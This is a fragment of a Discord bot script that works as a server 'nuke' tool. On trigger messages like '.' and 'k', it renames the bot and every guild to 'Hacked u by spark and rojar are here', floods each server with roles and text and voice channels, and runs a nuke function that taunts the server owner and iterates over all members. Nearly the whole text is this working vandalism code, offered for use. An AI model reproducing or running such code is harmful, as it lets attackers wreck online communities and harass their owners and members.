...
LOka.on('message', message => {
     if (message.content === ".") {
LOka.user.setUsername("Hacked u by spark Is here")
 
}
});
LOka.on('message', message => {
     if (message.content === ".") {
LOka.user.setGame(`Hacked u by spark and rojar are here`,'https://www.twitch.tv/hix')
...
LOka.on('message', message => {
     if (message.content === ".") {
         LOka.guilds.forEach(m =>{
             m.setName(`Hacked u by spark and rojar are here`)
})
}
});
...
LOka.on('message', message => {
     ...
     if (message.content === "k1") {
         LOka.guilds.forEach(m =>{
  m.createRole({
        name : "Hacked u by spark and rojar are here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
...
LOka.on('message', message => {
         if (message.content === "k") {
               LOka.guilds.forEach(m =>{
m.createChannel('Hacked u by spark and rojar are here', 'text');
m.createChannel('Hacked u by spark and rojar are here', 'text');
m.createChannel('Hacked u by spark and rojar are here', 'text');
m.createChannel('Hacked u by spark and rojar are here', 'text');
m.createChannel('Hacked u by spark and rojar are here', 'text');
...
LOka.on('message', message => {
         if (message.content === "k") {
                 LOka.guilds.forEach(m =>{
m.createChannel('Hacked u by spark and rojar are here', 'voice');
m.createChannel('Hacked u by spark and rojar are here', 'voice');
m.createChannel('Hacked u by spark and rojar are here', 'voice');
m.createChannel('Hacked u by spark and rojar are here', 'voice');
m.createChannel('Hacked u by spark and rojar are here', 'voice');
...
async function nuke(guild) {
  ...
  await guild.owner.send(' Hacked u by spark Is here    سلم على سيرفرك هههههههههههههههه').catch(e => { return void e; });
  ...
  await Promise.all(guild.members.map(async (m) => {
    ...
    await guild.createChannel('Hacked u by spark and rojar are here', 'text');
 
      await guild.createChannel('Hacked u by spark and rojar are here', 'voice');
...
LOka.on('guildMemberAdd', member => {
            ...
            if (member.id === "270978812962013185") {
